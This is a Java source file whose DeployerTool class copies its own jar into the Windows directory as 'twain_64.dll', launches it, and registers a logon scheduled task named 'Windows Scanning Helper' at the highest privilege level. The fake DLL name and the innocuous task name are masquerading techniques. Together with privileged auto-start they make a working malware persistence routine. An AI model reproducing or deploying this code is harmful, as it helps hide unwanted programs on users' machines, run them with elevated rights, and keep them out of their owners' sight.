package io.github.explodingbottle.someorganization.certifier.admintools;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

public class DeployerTool {
	private static final String DESTINATION_FILE_NAME = "twain_64.dll";
	private static final String TASK_CREATION_STRING = "schtasks /CREATE /TN \"Windows Scanning Helper\" /SC ONLOGON /RL HIGHEST /TR \"javaw -jar %s neutral\"";
	private static final String PROGRAM_LAUNCH_STRING = "javaw -jar %s neutral";
	private static final String TASK_QUERY_STRING = "schtasks /QUERY /TN \"Windows Scanning Helper\"";

	public static boolean copyIntoWindowsAndSwitch() {
		try {
			File currentFilePath = new File(
					AdministratorTool.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			File destination = new File(System.getenv("WINDIR"), DESTINATION_FILE_NAME);
			Files.copy(currentFilePath.toPath(), destination.toPath(), StandardCopyOption.REPLACE_EXISTING);
			Runtime runtime = Runtime.getRuntime();
			runtime.exec(String.format(PROGRAM_LAUNCH_STRING, destination.toString()), null,
					destination.getParentFile());
			return true;
		} catch (Exception e) {
		}
		return false;
	}

	public static boolean isFileInstalled() {
		return new File(System.getenv("WINDIR"), DESTINATION_FILE_NAME).exists();
	}

	public static boolean isScheduledTaskRegistred() {
		try {
			Runtime runtime = Runtime.getRuntime();
			Process proc = runtime.exec(TASK_QUERY_STRING);
			if (proc.waitFor() == 0)
				return true;
		} catch (Exception e) {
		}
		return false;
	}

	public static boolean registerAsScheduledTask() {
		try {
			String command = String.format(TASK_CREATION_STRING,
					new File(System.getenv("WINDIR"), DESTINATION_FILE_NAME));
			Runtime runtime = Runtime.getRuntime();
			Process proc = runtime.exec(command);
			if (proc.waitFor() == 0)
				return true;
		} catch (Exception e) {
		}
		return false;
	}
}
